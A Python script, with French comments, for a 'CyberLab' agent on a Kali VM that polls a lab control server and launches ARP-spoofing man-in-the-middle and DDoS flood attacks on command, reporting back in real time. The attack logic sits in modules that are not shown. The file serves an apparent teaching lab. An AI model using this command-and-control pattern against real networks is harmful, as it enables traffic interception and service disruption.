#!/usr/bin/env python3
"""
Agent CyberLab — tourne sur la VM Kali.
Il interroge le serveur toutes les secondes pour recevoir des ordres,
puis exécute les attaques et remonte les données en temps réel.
"""

import threading
import time
import requests
import subprocess
import sys
from scapy.all import get_if_hwaddr, conf

# ── Configuration ──────────────────────────────────────────────
SERVER_URL = "http://192.168.100.1:5000"
INTERFACE  = "eth0"      # adapter si besoin (ip a pour vérifier)
MY_IP      = "192.168.100.3"
POLL_INTERVAL = 1        # secondes


def report(data: dict):
    try:
        requests.post(f"{SERVER_URL}/api/report", json=data, timeout=3)
    except Exception as e:
        print(f"[!] Erreur envoi rapport: {e}")


def poll() -> dict:
    try:
        r = requests.get(f"{SERVER_URL}/api/poll", timeout=3)
        return r.json()
    except Exception:
        return {"command": "none"}


def hello():
    try:
        mac = get_if_hwaddr(INTERFACE)
    except Exception:
        mac = "00:00:00:00:00:00"
    report({"type": "agent_hello", "ip": MY_IP, "mac": mac})


# ── Threads d'attaque actifs ───────────────────────────────────
mitm_thread = None
ddos_thread = None
mitm_stop   = threading.Event()
ddos_stop   = threading.Event()


def run_mitm(victim_ip: str, gateway_ip: str):
    """ARP Spoofing avec Scapy."""
    from mitm import MITMAttack
    attack = MITMAttack(
        victim_ip=victim_ip,
        gateway_ip=gateway_ip,
        interface=INTERFACE,
        stop_event=mitm_stop,
        report_fn=report,
    )
    attack.run()


def run_ddos(target_ip: str, attack_type: str, pps: int):
    """Flood DDoS avec Scapy."""
    from ddos import DDoSAttack
    attack = DDoSAttack(
        target_ip=target_ip,
        attack_type=attack_type,
        pps=pps,
        interface=INTERFACE,
        stop_event=ddos_stop,
        report_fn=report,
    )
    attack.run()


def main():
    global mitm_thread, ddos_thread

    print("[*] CyberLab Agent démarré")
    print(f"[*] Serveur : {SERVER_URL}")
    print(f"[*] Interface: {INTERFACE}")

    # Annonce au serveur
    hello()

    while True:
        cmd = poll()
        command = cmd.get("command", "none")

        if command == "start_mitm":
            if mitm_thread and mitm_thread.is_alive():
                print("[!] MITM déjà actif")
            else:
                mitm_stop.clear()
                mitm_thread = threading.Thread(
                    target=run_mitm,
                    args=(cmd.get("victim_ip", "192.168.100.2"),
                          cmd.get("gateway_ip", "192.168.100.1")),
                    daemon=True
                )
                mitm_thread.start()
                print(f"[+] MITM lancé → victime: {cmd.get('victim_ip')} | GW: {cmd.get('gateway_ip')}")

        elif command == "stop_mitm":
            mitm_stop.set()
            print("[*] MITM stoppé")

        elif command == "start_ddos":
            if ddos_thread and ddos_thread.is_alive():
                print("[!] DDoS déjà actif")
            else:
                ddos_stop.clear()
                ddos_thread = threading.Thread(
                    target=run_ddos,
                    args=(cmd.get("target_ip", "192.168.100.2"),
                          cmd.get("attack_type", "udp"),
                          cmd.get("pps", 500)),
                    daemon=True
                )
                ddos_thread.start()
                print(f"[+] DDoS lancé → cible: {cmd.get('target_ip')} | type: {cmd.get('attack_type')} | pps: {cmd.get('pps')}")

        elif command == "stop_ddos":
            ddos_stop.set()
            print("[*] DDoS stoppé")

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Agent arrêté")
        mitm_stop.set()
        ddos_stop.set()
        sys.exit(0)